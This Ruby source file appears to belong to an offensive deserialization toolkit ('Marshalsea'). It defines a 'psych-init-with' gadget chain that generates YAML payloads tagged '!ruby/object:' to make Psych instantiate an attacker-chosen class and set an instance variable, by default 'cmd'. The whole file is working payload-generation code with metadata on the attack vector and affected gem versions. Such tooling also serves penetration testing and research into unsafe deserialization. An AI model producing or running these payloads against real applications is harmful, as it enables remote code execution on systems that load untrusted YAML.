# ©AngelaMos | 2026
# psych_init_with.rb
# frozen_string_literal: true

require "psych"

module Marshalsea
  module Chains
    class PsychInitWith < Base
      CHAIN_NAME = "psych-init-with"
      VECTOR = "init_with"
      CVE = "none"
      TARGET_GEM = "psych"

      AFFECTED = [[">= 0"]].map { |constraints| constraints.map(&:freeze).freeze }.freeze

      DOCUMENT_TEMPLATE = <<~YAML
        --- !ruby/object:%<class_name>s
        %<ivar>s: %<value>s
      YAML

      DEFAULT_IVAR = "cmd"

      METADATA = {
        name: CHAIN_NAME,
        vector: VECTOR,
        cve: CVE,
        gem: TARGET_GEM,
        affected: AFFECTED,
        kind: KIND_CHAIN
      }.freeze

      def self.metadata
        METADATA
      end

      def initialize(class_name, value, ivar: DEFAULT_IVAR)
        super()
        @class_name = class_name
        @value = value
        @ivar = ivar
      end

      def generate
        format(DOCUMENT_TEMPLATE, class_name: class_name, ivar: ivar, value: value.inspect)
      end

      def serialize
        generate
      end

      private

      attr_reader :class_name, :value, :ivar
    end
  end
end
